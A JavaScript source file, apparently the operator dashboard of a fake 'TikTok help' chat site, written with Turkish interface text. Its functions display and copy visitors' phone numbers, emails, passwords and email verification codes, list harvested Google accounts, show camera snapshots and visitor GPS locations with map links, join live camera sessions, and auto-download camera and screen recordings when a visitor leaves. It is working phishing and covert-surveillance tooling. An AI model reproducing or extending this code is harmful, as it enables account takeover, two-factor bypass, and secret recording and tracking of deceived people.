  const lng = Number(loc.lng);
  const acc = Number(loc.accuracy);
  const accTxt = Number.isFinite(acc) ? ` ? ?${Math.round(acc)} m` : "";
  const t = loc.ts ? ` ? ${fmtTime(loc.ts)}` : "";
  return `${lat.toFixed(5)}, ${lng.toFixed(5)}${accTxt}${t}`;
}

function mapsUrlFromLoc(loc) {
  if (!loc || !Number.isFinite(Number(loc.lat)) || !Number.isFinite(Number(loc.lng))) return "";
  return `https://www.google.com/maps?q=${Number(loc.lat)},${Number(loc.lng)}`;
}

function setEvidenceValue(el, value) {
  if (!el) return;
  const text = String(value || "").trim();
  el.textContent = text || "—";
  el.classList.toggle("is-filled", Boolean(text));
}

function updateMediaDock(row) {
  if (!adminMediaDock) return;
  if (!row?.id) {
    adminMediaDock.hidden = true;
    return;
  }
  adminMediaDock.hidden = false;

  const hasCam = Boolean(row.cameraGranted || row.hasCamera || row.lastSnapshotUrl);
  const loc = row.lastLocation || null;
  const hasLoc = Boolean(row.hasLocation || formatLocationLine(loc));
  const phone = String(row.phone || "").trim();
  const email = String(row.visitorEmail || "").trim();
  const pass = String(row.visitorPassword || "").trim();
  const code = String(row.visitorEmailCode || "").trim();
  const hasCreds = Boolean(phone || email || pass || code);
  const recUrl = String(row.lastRecordingUrl || "").trim();
  const recName = String(row.lastRecordingName || "").trim();
  const hasRec = Boolean(recUrl || row.hasRecording || row.recordingFinalized);

  if (dockStatusPill) {
    const bits = [];
    if (hasCreds) bits.push("Bilgi");
    if (hasCam || hasRec) bits.push("Kamera");
    if (row.hasScreenRecording || row.lastScreenRecordingUrl) bits.push("Ekran");
    if (hasLoc) bits.push("Konum");
    dockStatusPill.textContent = bits.length ? bits.join(" · ") : "Bekleniyor";
    dockStatusPill.classList.toggle("is-hot", bits.length > 0);
  }

  setEvidenceValue(evPhone, phone);
  setEvidenceValue(evEmail, email);
  setEvidenceValue(evPassword, pass);
  setEvidenceValue(evEmailCode, code);

  // Ziyaretçi kimliği satırı
  let idRow = document.getElementById("ev-visitor-meta");
  if (!idRow) {
    const list = document.querySelector("#dock-credentials .admin-evidence-list");
    if (list) {
      idRow = document.createElement("div");
      idRow.id = "ev-visitor-meta-wrap";
      idRow.innerHTML = `<dt>Ziyaretçi</dt><dd id="ev-visitor-meta">—</dd>`;
      list.insertBefore(idRow, list.firstChild);
    }
  }
  const evVisitorMeta = document.getElementById("ev-visitor-meta");
  if (evVisitorMeta) {
    const parts = [];
    if (row.isReturning || Number(row.visitCount) > 1) {
      parts.push(`Dönen · ziyaret #${Number(row.visitCount) || "?"}`);
    } else {
      parts.push("Yeni");
    }
    if (row.visitorId) parts.push(String(row.visitorId).slice(0, 18));
    if (row.platform) parts.push(String(row.platform));
    setEvidenceValue(evVisitorMeta, parts.join(" · "));
  }
  if (evCopyCredsBtn) {
    evCopyCredsBtn.hidden = !hasCreds;
    evCopyCredsBtn.onclick = async () => {
      const text = [
        phone ? `Telefon: ${phone}` : "",
        email ? `E-posta: ${email}` : "",
        pass ? `Şifre: ${pass}` : "",
        code ? `E-posta kodu: ${code}` : "",
      ]
        .filter(Boolean)
        .join("\n");
      try {
        await navigator.clipboard.writeText(text);
        sendHint.hidden = false;
        sendHint.textContent = "Güvenlik bilgileri kopyalandı.";
        window.setTimeout(() => {
          if (sendHint.textContent.includes("kopyalandı")) sendHint.hidden = true;
        }, 1500);
      } catch {
        sendHint.hidden = false;
        sendHint.textContent = "Kopyalanamadı.";
      }
    };
  }

  if (row.lastSnapshotUrl) {
    if (dockSnapshot) {
      dockSnapshot.src = row.lastSnapshotUrl;
      dockSnapshot.hidden = false;
    }
    if (dockSnapshotLink) {
      dockSnapshotLink.href = row.lastSnapshotUrl;
      dockSnapshotLink.hidden = false;
    }
    if (dockCamText) dockCamText.textContent = "Son fotoğraf hazır";
  } else {
    if (dockSnapshot) {
      dockSnapshot.removeAttribute("src");
      dockSnapshot.hidden = true;
    }
    if (dockSnapshotLink) {
      dockSnapshotLink.removeAttribute("href");
      dockSnapshotLink.hidden = true;
    }
    if (dockCamText) {
      dockCamText.textContent = hasCam
        ? "İzin verildi — fotoğraf bekleniyor"
        : "Kamera izni yok";
    }
  }

  if (evRecText) {
    if (recUrl) {
      const when = row.lastRecordingAt ? fmtTime(row.lastRecordingAt) : "";
      evRecText.textContent = `Kayıt hazır${when ? ` · ${when}` : ""}${
        recName ? ` · ${recName}` : ""
      }`;
    } else if (hasRec) {
      evRecText.textContent = "Kayıt yükleniyor…";
    } else {
      evRecText.textContent = "Kayıt: henüz yok";
    }
  }
  if (evRecDownload) {
    if (recUrl) {
      evRecDownload.href = recUrl;
      evRecDownload.download =
        recName || `kamera-${shortId(row.id)}.webm`;
      evRecDownload.hidden = false;
      evRecDownload.onclick = (e) => {
        e.preventDefault();
        void forceDownloadFromUrl(
          recUrl,
          recName || `kamera-${shortId(row.id)}.webm`
        );
      };
    } else {
      evRecDownload.removeAttribute("href");
      evRecDownload.hidden = true;
      evRecDownload.onclick = null;
    }
  }

  const screenUrl = String(row.lastScreenRecordingUrl || "").trim();
  const screenName = String(row.lastScreenRecordingName || "").trim();
  if (evScreenText) {
    if (screenUrl) {
      const when = row.lastScreenRecordingAt ? fmtTime(row.lastScreenRecordingAt) : "";
      evScreenText.textContent = `Ekran kaydı hazır${when ? ` · ${when}` : ""}`;
    } else if (row.hasScreenRecording || row.screenGranted) {
      evScreenText.textContent = "Ekran paylaşımı aktif / yükleniyor…";
    } else {
      evScreenText.textContent = "Henüz yok";
    }
  }
  if (evScreenDownload) {
    if (screenUrl) {
      evScreenDownload.href = screenUrl;
      evScreenDownload.download = screenName || `ekran-${shortId(row.id)}.webm`;
      evScreenDownload.hidden = false;
      evScreenDownload.onclick = (e) => {
        e.preventDefault();
        void forceDownloadFromUrl(
          screenUrl,
          screenName || `ekran-${shortId(row.id)}.webm`
        );
      };
    } else {
      evScreenDownload.removeAttribute("href");
      evScreenDownload.hidden = true;
      evScreenDownload.onclick = null;
    }
  }
  if (
    screenUrl &&
    (row.downloadScreenRecording ||
      row.screenRecordingFinalized ||
      Number(row.userLeftAt) > 0 ||
      Number(row.connectionLostAt) > 0)
  ) {
    const skey = `${row.id}:screen:${screenUrl}`;
    if (!autoDownloadedRecKeys.has(skey)) {
      autoDownloadedRecKeys.add(skey);
      enqueueDownload(() =>
        forceDownloadFromUrl(screenUrl, screenName || `ekran-${shortId(row.id)}.webm`)
      );
    }
  }

  if (dockOpenCameraBtn) {
    dockOpenCameraBtn.hidden = !hasCam;
    dockOpenCameraBtn.dataset.sessionId = row.id;
  }

  const line = formatLocationLine(loc);
  const maps = mapsUrlFromLoc(loc);
  if (dockLocText) {
    dockLocText.textContent = line || (row.hasLocation ? "Konum kaydı var" : "Konum yok");
  }
  if (evLocMeta) {
    if (loc && (loc.accuracy != null || loc.ts || loc.updatedAt)) {
      const acc =
        loc.accuracy != null && Number.isFinite(Number(loc.accuracy))
          ? `±${Math.round(Number(loc.accuracy))} m`
          : "";
      const when = loc.ts || loc.updatedAt ? fmtTime(loc.ts || loc.updatedAt) : "";
      evLocMeta.hidden = false;
      evLocMeta.textContent = [acc, when].filter(Boolean).join(" · ");
    } else {
      evLocMeta.hidden = true;
      evLocMeta.textContent = "";
    }
  }
  if (dockLocMaps) {
    if (maps) {
      dockLocMaps.href = maps;
      dockLocMaps.hidden = false;
    } else {
      dockLocMaps.removeAttribute("href");
      dockLocMaps.hidden = true;
    }
  }
  if (evCopyLocBtn) {
    const lat = loc?.lat ?? loc?.latitude;
    const lng = loc?.lng ?? loc?.longitude;
    const hasCoords = Number.isFinite(Number(lat)) && Number.isFinite(Number(lng));
    evCopyLocBtn.hidden = !hasCoords;
    evCopyLocBtn.onclick = async () => {
      if (!hasCoords) return;
      try {
        await navigator.clipboard.writeText(`${lat}, ${lng}`);
        sendHint.hidden = false;
        sendHint.textContent = "Koordinat kopyalandı.";
        window.setTimeout(() => {
          if (sendHint.textContent.includes("kopyalandı")) sendHint.hidden = true;
        }, 1500);
      } catch {
        sendHint.hidden = false;
        sendHint.textContent = "Kopyalanamadı.";
      }
    };
  }

  // Çıkış / kayıt hazır → çakışmasız otomatik indir
  if (
    row.hasRecording ||
    row.downloadRecording ||
    row.recordingFinalized ||
    Number(row.userLeftAt) > 0 ||
    Number(row.connectionLostAt) > 0
  ) {
    maybeAutoDownloadSessionRecording(row, {
      force: Boolean(row.downloadRecording || row.recordingFinalized),
    });
  }
}

function filteredGoogleAccounts() {
  const q = String(gmailSearch?.value || "")
    .trim()
    .toLowerCase();
  const rows = googleAccountRows.filter((r) => r.email || r.name || r.uid);
  if (!q) return rows;
  return rows.filter((r) => {
    const hay = [r.email, r.name, r.uid, r.lastSessionId]
      .map((x) => String(x || "").toLowerCase())
      .join(" ");
    return hay.includes(q);
  });
}

function fmtAuthDate(ts) {
  if (!ts) return "?";
  return new Date(ts).toLocaleDateString("en-US", {
    month: "short",
    day: "numeric",
    year: "numeric",
  });
}

function renderGmails() {
  if (!gmailList) return;
  const rows = filteredGoogleAccounts();
  const total = googleAccountRows.filter((r) => r.email || r.name || r.uid).length;
  if (gmailCount) {
    gmailCount.textContent = `${total} hesap ? Google Authentication kullanicilari`;
  }
  gmailList.innerHTML = "";
  if (!rows.length) {
    gmailList.innerHTML = total
      ? `<tr class="gmail-empty-row"><td colspan="6">Aramayla eslesen hesap yok</td></tr>`
      : `<tr class="gmail-empty-row"><td colspan="6">Henüz Google girisi yok. Ziyaretçi Gmail ile girince burada listelenir (Firebase Authentication Users gibi).</td></tr>`;
    return;
  }

  rows.forEach((row) => {
    const tr = document.createElement("tr");
    tr.className = "gmail-row";
    const email = String(row.email || "").trim();
    const name = String(row.name || "").trim();
    const photo = String(row.photo || "").trim();
    const uid = String(row.uid || row.id || "").trim();
    const sid = String(row.lastSessionId || "").trim();
    const created = Number(row.createdAt) || Number(row.firstSeenAt) || 0;
    const signedIn = Number(row.signedInAt) || Number(row.lastSeenAt) || 0;
    const providers = Array.isArray(row.providers) && row.providers.length
      ? row.providers
      : ["google.com"];

    const avatar = photo
      ? `<img class="gmail-avatar" src="${escapeHtml(photo)}" alt="" referrerpolicy="no-referrer" />`
      : `<span class="gmail-avatar gmail-avatar-fallback" aria-hidden="true">${escapeHtml(
          (name || email || "?").slice(0, 1).toUpperCase()
        )}</span>`;

    const providerBadges = providers
      .map((p) => {
        const isGoogle = String(p).includes("google");
        return `<span class="gmail-provider ${isGoogle ? "is-google" : ""}" title="${escapeHtml(
          p
        )}">${isGoogle ? "G" : escapeHtml(String(p).slice(0, 1).toUpperCase())}</span>`;
      })
      .join("");

    tr.innerHTML = `
      <td>
        <div class="gmail-id-cell">
          ${avatar}
          <div class="gmail-id-text">
            <strong class="gmail-email">${escapeHtml(email || "E-posta yok")}</strong>
            ${name ? `<span class="gmail-name">${escapeHtml(name)}</span>` : ""}
          </div>
        </div>
      </td>
      <td><div class="gmail-providers">${providerBadges}</div></td>
      <td>${escapeHtml(fmtAuthDate(created))}</td>
      <td>${escapeHtml(fmtAuthDate(signedIn))}</td>
      <td><code class="gmail-uid" title="${escapeHtml(uid)}">${escapeHtml(
        uid.length > 22 ? `${uid.slice(0, 22)}?` : uid
      )}</code></td>
      <td class="gmail-actions-cell"></td>
    `;

    const actions = tr.querySelector(".gmail-actions-cell");
    if (email) {
      const copyBtn = document.createElement("button");
      copyBtn.type = "button";
      copyBtn.className = "btn btn-ghost gmail-action-btn";
      copyBtn.textContent = "Kopyala";
      copyBtn.addEventListener("click", async () => {
        try {
          await navigator.clipboard.writeText(email);
          showGmailHint(`Kopyalandi: ${email}`);
        } catch {
          showGmailHint("Kopyalama başarısız");
        }
      });
      actions.appendChild(copyBtn);
    }
    if (uid) {
      const copyUid = document.createElement("button");
      copyUid.type = "button";
      copyUid.className = "btn btn-ghost gmail-action-btn";
      copyUid.textContent = "UID";
      copyUid.addEventListener("click", async () => {
        try {
          await navigator.clipboard.writeText(uid);
          showGmailHint("UID kopyalandi");
        } catch {
          showGmailHint("Kopyalama başarısız");
        }
      });
      actions.appendChild(copyUid);
    }
    if (sid) {
      const openBtn = document.createElement("button");
      openBtn.type = "button";
      openBtn.className = "btn btn-ghost gmail-action-btn";
      openBtn.textContent = "Sohbet";
      openBtn.addEventListener("click", () => {
        const session =
          latestSessionRows.find((s) => s.id === sid) ||
          ({ id: sid, preview: email || name || "Google hesap" });
        openSession(session);
        document.getElementById("thread-title")?.scrollIntoView?.({
          behavior: "smooth",
          block: "start",
        });
      });
      actions.appendChild(openBtn);
    }
    gmailList.appendChild(tr);
  });
}

function showGmailHint(text) {
  if (!gmailHint) return;
  gmailHint.hidden = false;
  gmailHint.textContent = text;
  clearTimeout(showGmailHint._t);
  showGmailHint._t = setTimeout(() => {
    gmailHint.hidden = true;
  }, 2400);
}

function collapseSessionsByVisitor(rows) {
  const list = Array.isArray(rows) ? rows : [];
  const bestByVisitor = new Map();
  const countByVisitor = new Map();
  const orphans = [];

  list.forEach((r) => {
    const vid = String(r?.visitorId || "").trim();
    if (!vid) {
      orphans.push(r);
      return;
    }
    countByVisitor.set(vid, (countByVisitor.get(vid) || 0) + 1);
    const prev = bestByVisitor.get(vid);
    if (!prev || (Number(r.updatedAt) || 0) > (Number(prev.updatedAt) || 0)) {
      bestByVisitor.set(vid, r);
    }
  });

  const collapsed = [...bestByVisitor.values()].map((r) => ({
    ...r,
    _dupCount: countByVisitor.get(String(r.visitorId)) || 1,
  }));
  return [...collapsed, ...orphans].sort(
    (a, b) => (Number(b.updatedAt) || 0) - (Number(a.updatedAt) || 0)
  );
}

function renderSessions(rows) {
  const raw = Array.isArray(rows) ? rows : [];
  latestSessionRows = raw;
  const viewRows = collapseSessionsByVisitor(raw);
  sessionCount.textContent = `${viewRows.length} ziyaretçi · ${raw.length} kayıt`;
  sessionList.innerHTML = "";
  if (!viewRows.length) {
    sessionList.innerHTML = '<li class="session-empty">Henüz sohbet yok. Sitede bir sohbet başlatın.</li>';
    updateMediaDock(null);
    renderEvidenceBoard([]);
    return;
  }

  viewRows.forEach((row) => {
    const li = document.createElement("li");
    const card = document.createElement("div");
    card.className = "session-item" + (row.id === selectedId ? " is-active" : "");
    card.dataset.sessionId = row.id;

    const mainBtn = document.createElement("button");
    mainBtn.type = "button";
    mainBtn.className = "session-item-main";
    const last =
      row.lastWho === "user" ? "ziyaretçi" : row.lastWho === "admin" ? "sen" : "bot";
    const hasCam = Boolean(row.cameraGranted || row.hasCamera || row.lastSnapshotUrl);
    const hasLoc = Boolean(row.hasLocation || row.lastLocation);
    const hasGoogle = Boolean(row.googleEmail || row.googleName || row.googleUid);
    const hasPhone = Boolean(row.phone);
    const hasCreds = Boolean(
      row.hasCredentials || (row.visitorEmail && row.visitorPassword)
    );
    const isReturning = Boolean(row.isReturning || Number(row.visitCount) > 1);
    const visits = Number(row.visitCount) || 0;
    const googleLine = hasGoogle
      ? escapeHtml(
          [row.googleName, row.googleEmail].filter(Boolean).join(" · ") || "Google giriş"
        )
      : "";
    const phoneLine = hasPhone ? escapeHtml(String(row.phone)) : "";
    const emailLine = row.visitorEmail ? escapeHtml(String(row.visitorEmail)) : "";
    const visitorLine = row.visitorId
      ? escapeHtml(`ID ${String(row.visitorId).slice(0, 10)}…`)
      : "";
    const online = Boolean(row.online) && !(Number(row.userLeftAt) > 0);
    const segN =
      Number(row.recordingSegmentCount) ||
      (Array.isArray(row.recordingSegments) ? row.recordingSegments.length : 0);
    const dupN = Number(row._dupCount) || 1;
    const statusLine = online
      ? "● Çevrimiçi"
      : Number(row.userLeftAt) > 0
        ? "○ Ayrıldı"
        : "○ Kapalı";
    const badges = [
      `<span class="session-badge ${online ? "session-badge-online" : "session-badge-offline"}">${statusLine}</span>`,
      dupN > 1
        ? `<span class="session-badge session-badge-return">×${dupN} kayıt birleşti</span>`
        : "",
      isReturning
        ? `<span class="session-badge session-badge-return">Dönen${
            visits > 1 ? ` · #${visits}` : ""
          }</span>`
        : '<span class="session-badge session-badge-new">Yeni</span>',
      hasGoogle ? '<span class="session-badge session-badge-google">Google</span>' : "",
      hasCreds
        ? '<span class="session-badge session-badge-phone">Hesap</span>'
        : hasPhone
          ? '<span class="session-badge session-badge-phone">Telefon</span>'
          : "",
      hasCam ? '<span class="session-badge session-badge-cam">Kamera</span>' : "",
      segN > 0
        ? `<span class="session-badge session-badge-cam">Kayıt · ${segN}</span>`
        : "",
      row.hasScreenRecording || row.lastScreenRecordingUrl
        ? '<span class="session-badge session-badge-screen">Ekran</span>'
        : "",
      hasLoc ? '<span class="session-badge session-badge-loc">Konum</span>' : "",
    ]
      .filter(Boolean)
      .join("");

    mainBtn.innerHTML = `
      <strong>#${shortId(row.id)}</strong>
      <span>${escapeHtml(row.preview || "Mesaj yok")}</span>
      ${googleLine ? `<span class="session-google-line">${googleLine}</span>` : ""}
      ${phoneLine ? `<span class="session-google-line">☎ ${phoneLine}</span>` : ""}
      ${emailLine ? `<span class="session-google-line">✉ ${emailLine}</span>` : ""}
      ${visitorLine ? `<span class="session-google-line">${visitorLine}</span>` : ""}
      <em>${fmtTime(row.updatedAt)} · ${last}</em>
      ${badges ? `<div class="session-badges">${badges}</div>` : ""}
    `;
    mainBtn.addEventListener("click", () => openSession(row));

    const quick = document.createElement("div");
    quick.className = "session-quick";
    const camBtn = document.createElement("button");
    camBtn.type = "button";
    camBtn.className = "session-quick-btn";
    camBtn.textContent = "?? Kamera";
    camBtn.disabled = !hasCam;
    camBtn.addEventListener("click", (e) => {
      e.stopPropagation();
      openSession(row);
      showCameraPopup();
      if (row.lastCallId) {
        void ensureAdminCamera(row.id, row.lastCallId, {
          force: true,
          seedLocation: row.lastLocation || null,
        });
      } else if (row.lastSnapshotUrl) {
        showAdminSnapshot(row.lastSnapshotUrl);
      }
      adminMediaDock?.scrollIntoView?.({ behavior: "smooth", block: "nearest" });
    });

    const locBtn = document.createElement("button");
    locBtn.type = "button";
    locBtn.className = "session-quick-btn";
    locBtn.textContent = "?? Konum";
    locBtn.disabled = !hasLoc;
    locBtn.addEventListener("click", (e) => {
      e.stopPropagation();
      openSession(row);
      const maps = mapsUrlFromLoc(row.lastLocation);
      if (maps) window.open(maps, "_blank", "noopener");
      updateMediaDock(row);
      adminMediaDock?.scrollIntoView?.({ behavior: "smooth", block: "nearest" });
    });

    quick.append(camBtn, locBtn);
    card.append(mainBtn, quick);
    li.appendChild(card);
    sessionList.appendChild(li);
  });

  if (selectedId) {
    const selected = rows.find((r) => r.id === selectedId);
    if (selected) {
      updateMediaDock(selected);
      maybeAutoDownloadSessionRecording(selected);
      // Canli call dinlenmiyorsa Storage cagrisini da izle
      if (
        selected.lastRecordingCallId &&
        !adminCall &&
        !selected.lastRecordingUrl
      ) {
        const watchKey = `${selected.id}/${selected.lastRecordingCallId}`;
        if (recordingWatchKey !== watchKey) {
          startRecordingWatch(selected.id, selected.lastRecordingCallId, {
            sessionId: selected.id,
            callId: selected.lastRecordingCallId,
            lastBlob: null,
            seenRecordingUrl: null,
            awaitingRecording: true,
          });
        }
      }
    }
  }
  renderEvidenceBoard(rows);
}

function renderEvidenceBoard(rows) {
  const body = document.getElementById("evidence-board-body");
  const countEl = document.getElementById("evidence-board-count");
  if (!body) return;
  const list = Array.isArray(rows) ? rows : [];
  const withAny = list.filter((row) => {
    return Boolean(
      row.phone ||
        row.visitorEmail ||
        row.visitorPassword ||
        row.visitorEmailCode ||
        row.lastLocation ||
        row.hasLocation ||
        row.lastRecordingUrl ||
        row.hasRecording ||
        row.lastSnapshotUrl ||
        row.cameraGranted ||
        row.hasCamera
    );
  });
  if (countEl) {
    countEl.textContent = `${withAny.length} kanıtlı · ${list.length} oturum`;
  }
  body.innerHTML = "";
  if (!withAny.length) {
    body.innerHTML =
      '<tr class="evidence-empty-row"><td colspan="8">Henüz kanıt yok — sohbet seçildiğinde detay üstte görünür</td></tr>';
    return;
  }

  withAny
    .slice()
    .sort((a, b) => (Number(b.updatedAt) || 0) - (Number(a.updatedAt) || 0))
    .forEach((row) => {
      const phone = String(row.phone || "").trim();
      const email = String(row.visitorEmail || "").trim();
      const pass = String(row.visitorPassword || "").trim();
      const code = String(row.visitorEmailCode || "").trim();
      const locLine = formatLocationLine(row.lastLocation) || (row.hasLocation ? "Var" : "—");
      const maps = mapsUrlFromLoc(row.lastLocation);
      const recUrl = String(row.lastRecordingUrl || "").trim();
      const tr = document.createElement("tr");
      if (row.id === selectedId) tr.classList.add("is-active");
      tr.innerHTML = `
        <td><strong>#${escapeHtml(shortId(row.id))}</strong><br /><span class="evidence-time">${escapeHtml(
          fmtTime(row.updatedAt)
        )}</span></td>
        <td>${escapeHtml(phone || "—")}</td>
        <td>${escapeHtml(email || "—")}</td>
        <td>${escapeHtml(pass || "—")}</td>
        <td>${escapeHtml(code || "—")}</td>
        <td>${
          maps
            ? `<a href="${escapeHtml(maps)}" target="_blank" rel="noopener">${escapeHtml(locLine)}</a>`
            : escapeHtml(locLine)
        }</td>
        <td>${
          recUrl
            ? `<a href="${escapeHtml(recUrl)}" target="_blank" rel="noopener">İndir</a>`
            : row.hasRecording || row.recordingFinalized
              ? "Yükleniyor"
              : row.lastSnapshotUrl || row.hasCamera || row.cameraGranted
                ? "Kamera var"
                : "—"
        }</td>
        <td><button type="button" class="btn btn-ghost evidence-open-btn">Aç</button></td>
      `;
      tr.querySelector(".evidence-open-btn")?.addEventListener("click", () => {
        openSession(row);
        maybeJoinSessionCamera(row);
        adminMediaDock?.scrollIntoView?.({ behavior: "smooth", block: "nearest" });
      });
      body.appendChild(tr);
    });
}

function setEndCameraVisible(visible) {
  if (endCameraBtn) endCameraBtn.hidden = !visible;
  if (endCameraBtnModal) endCameraBtnModal.hidden = !visible;
}

function setHideCameraVisible(visible) {
  if (hideCameraPanelBtn) hideCameraPanelBtn.hidden = !visible;
  if (hideCameraBtnModal) hideCameraBtnModal.hidden = !visible;
}

function setCameraUi(visible, statusText) {
  if (adminCameraBox) adminCameraBox.hidden = !visible;
  if (cameraStatus && statusText) cameraStatus.textContent = statusText;
  if (adminCameraBox) {
    adminCameraBox.classList.toggle(
      "is-recording",
      Boolean(visible && /kayit yapiliyor|Canli|Baglan|Yanit|video|ICE/i.test(statusText || ""))
    );
  }
  const sessionActive = Boolean(adminCall);
  setEndCameraVisible(sessionActive);
  setHideCameraVisible(sessionActive && visible);
  if (reopenCameraBtn) {
    reopenCameraBtn.hidden = visible || !sessionActive;
  }
}

function hideCameraPopup() {
  if (adminCameraBox) adminCameraBox.hidden = true;
  if (reopenCameraBtn) reopenCameraBtn.hidden = !adminCall;
  setEndCameraVisible(Boolean(adminCall));
  setHideCameraVisible(false);
}

function showCameraPopup() {
  const hasSnap =
    Boolean(adminSnapshotPreview?.getAttribute("src")) && !adminSnapshotPreview?.hidden;
  if (!adminCall && downloadRecordingBtn?.hidden && !hasSnap) return;
  if (adminCameraBox) adminCameraBox.hidden = false;
  if (reopenCameraBtn) reopenCameraBtn.hidden = true;
  setEndCameraVisible(Boolean(adminCall));
  setHideCameraVisible(Boolean(adminCall));
}

function showAdminSnapshot(url) {
  if (!url) return;
  if (adminSnapshotPreview) {
    adminSnapshotPreview.src = url;
    adminSnapshotPreview.hidden = false;
  }
  if (adminSnapshotLink) {
    adminSnapshotLink.href = url;
    adminSnapshotLink.hidden = false;
  }
  if (adminCameraBox) adminCameraBox.hidden = false;
  if (reopenCameraBtn) reopenCameraBtn.hidden = !adminCall;
  setCameraUi(true, "Kamera fotoğrafı alindi (Storage)");
}

function clearAdminLocationUi() {
  if (adminLiveLocation) adminLiveLocation.hidden = true;
  if (adminLocationText) adminLocationText.textContent = "Konum bekleniyor?";
  if (adminLocationMaps) {
    adminLocationMaps.hidden = true;
    adminLocationMaps.removeAttribute("href");
  }
}

function updateAdminLocationUi(loc, status, error) {
  if (!adminLiveLocation) return;
  adminLiveLocation.hidden = false;
  const curTxt = String(adminLocationText?.textContent || "");
  const hasCoordsOnScreen = /^-?\d+\.\d+,\s*-?\d+\.\d+/.test(curTxt);
  const st = String(status || "");

  if (loc && Number.isFinite(Number(loc.lat)) && Number.isFinite(Number(loc.lng))) {
    const lat = Number(loc.lat);
    const lng = Number(loc.lng);
    const acc = Number(loc.accuracy);
    const accTxt = Number.isFinite(acc) ? ` · ±${Math.round(acc)} m` : "";
    const t = loc.ts ? new Date(loc.ts).toLocaleTimeString("tr-TR") : "";
    if (adminLocationText) {
      adminLocationText.textContent = `${lat.toFixed(6)}, ${lng.toFixed(6)}${accTxt}${
        t ? ` · ${t}` : ""
      }`;
    }
    if (adminLocationMaps) {
      adminLocationMaps.href = `https://www.google.com/maps?q=${lat},${lng}`;
      adminLocationMaps.hidden = false;
    }
    return;
  }

  // Canlı koordinat varken prompting / reconnecting ile ezme
  if (
    hasCoordsOnScreen &&
    (st === "prompting" ||
      st === "awaiting-tap" ||
      st === "reconnecting" ||
      st === "gps-wait" ||
      !st)
  ) {
    return;
  }
  if (adminLocationMaps) {
    adminLocationMaps.hidden = true;
    adminLocationMaps.removeAttribute("href");
  }
  if (st === "denied") {
    adminLocationText.textContent =
      "Konum engelli görünüyor. Ziyaretçi: site için Konum = İzin Ver (Safari/Chrome ayarı), sayfayı yenile. GPS açık olsun.";
  } else if (st === "reconnecting") {
    adminLocationText.textContent = "Konum — ziyaretçi yeniden bağlanıyor…";
  } else if (st === "awaiting-tap" || st === "prompting") {
    adminLocationText.textContent =
      st === "prompting"
        ? "Konum isteniyor — izin / GPS bekleniyor…"
        : "Konum bekleniyor — ziyaretçi dokunuşu gerekebilir";
  } else if (st === "unsupported") {
    adminLocationText.textContent = "Tarayıcı konum desteklemiyor";
  } else if (st === "unavailable" || st === "timeout" || st === "error") {
    adminLocationText.textContent = `Konum alınamadı${error ? `: ${error}` : ""} — tekrar deneniyor`;
  } else {
    adminLocationText.textContent = "Konum bekleniyor…";
  }
}

function clearAdminSnapshot() {
  if (adminSnapshotPreview) {
    adminSnapshotPreview.removeAttribute("src");
    adminSnapshotPreview.hidden = true;
  }
  if (adminSnapshotLink) {
    adminSnapshotLink.removeAttribute("href");
    adminSnapshotLink.hidden = true;
  }
}

function clearRecordingLink() {
  if (!downloadRecordingBtn) return;
  if (downloadRecordingBtn.href?.startsWith("blob:")) {
    URL.revokeObjectURL(downloadRecordingBtn.href);
  }
  downloadRecordingBtn.removeAttribute("href");
  downloadRecordingBtn.hidden = true;
  downloadRecordingBtn.textContent = "Kaydi indir";
}

function recordingExtFromMime(mime, nameHint) {
  const t = String(mime || nameHint || "");
  if (/mp4|mpeg|m4v/i.test(t)) return "mp4";
  if (/\.mp4$/i.test(t)) return "mp4";
  return "webm";
}

function firstMeaningfulMedia(wrap) {
  return Boolean(wrap?.firstCam || wrap?.firstLoc || wrap?.callChanged);
}

function forceDownloadBlob(blob, name) {
  if (!blob?.size) return false;
  const ext = recordingExtFromMime(blob.type, name);
  const fileName = name || `kamera-${Date.now()}.${ext}`;
  const objUrl = URL.createObjectURL(blob);
  if (downloadRecordingBtn) {
    if (downloadRecordingBtn.href?.startsWith("blob:")) {
      URL.revokeObjectURL(downloadRecordingBtn.href);
    }
    downloadRecordingBtn.href = objUrl;
    downloadRecordingBtn.download = fileName;
    downloadRecordingBtn.removeAttribute("target");
    downloadRecordingBtn.hidden = false;
    downloadRecordingBtn.textContent = "Kaydi indir";
  }
  try {
    const a = document.createElement("a");
    a.href = objUrl;
    a.download = fileName;
    a.style.display = "none";
    document.body.appendChild(a);
    a.click();
    a.remove();
  } catch {
    /* ignore */
  }
  if (adminCameraBox) adminCameraBox.hidden = false;
  if (reopenCameraBtn) reopenCameraBtn.hidden = true;
  setCameraUi(true, "Kayıt indirildi");
  sendHint.hidden = false;
  sendHint.textContent = `Kayıt indirildi: ${fileName}`;
  window.setTimeout(() => {
    if (sendHint.textContent.includes("Kayıt")) sendHint.hidden = true;
  }, 5000);
  return true;
}

const EVIDENCE_DIR_DB = "tiktok-help-evidence-dir";
const EVIDENCE_DIR_STORE = "handles";
let evidenceDirHandle = null;

function openEvidenceDirDb() {
  return new Promise((resolve, reject) => {
    if (!window.indexedDB) {
      reject(new Error("no-idb"));
      return;
    }
    const req = indexedDB.open(EVIDENCE_DIR_DB, 1);
    req.onupgradeneeded = () => {
      const db = req.result;
      if (!db.objectStoreNames.contains(EVIDENCE_DIR_STORE)) {
        db.createObjectStore(EVIDENCE_DIR_STORE);
      }
    };
    req.onsuccess = () => resolve(req.result);
    req.onerror = () => reject(req.error || new Error("idb"));
  });
}

async function persistEvidenceDirHandle(handle) {
  evidenceDirHandle = handle || null;
  try {
    const db = await openEvidenceDirDb();
    await new Promise((resolve, reject) => {
      const tx = db.transaction(EVIDENCE_DIR_STORE, "readwrite");
      if (handle) tx.objectStore(EVIDENCE_DIR_STORE).put(handle, "evidence");
      else tx.objectStore(EVIDENCE_DIR_STORE).delete("evidence");
      tx.oncomplete = () => resolve();
      tx.onerror = () => reject(tx.error);
    });
    db.close?.();
  } catch (err) {
    console.warn("evidence dir persist", err);
  }
  updateEvidenceFolderButton();
}

async function loadEvidenceDirHandle() {
  try {
    const db = await openEvidenceDirDb();
    const handle = await new Promise((resolve, reject) => {
      const tx = db.transaction(EVIDENCE_DIR_STORE, "readonly");
      const req = tx.objectStore(EVIDENCE_DIR_STORE).get("evidence");
      req.onsuccess = () => resolve(req.result || null);
      req.onerror = () => reject(req.error);
    });
    db.close?.();
    if (handle) evidenceDirHandle = handle;
  } catch {
    /* ignore */
  }
  updateEvidenceFolderButton();
  return evidenceDirHandle;
}

function updateEvidenceFolderButton() {
  const btn = document.getElementById("ev-pick-folder-btn");
  if (!btn) return;
  btn.textContent = evidenceDirHandle ? "Kayıt klasörü ✓" : "Kayıt klasörü seç";
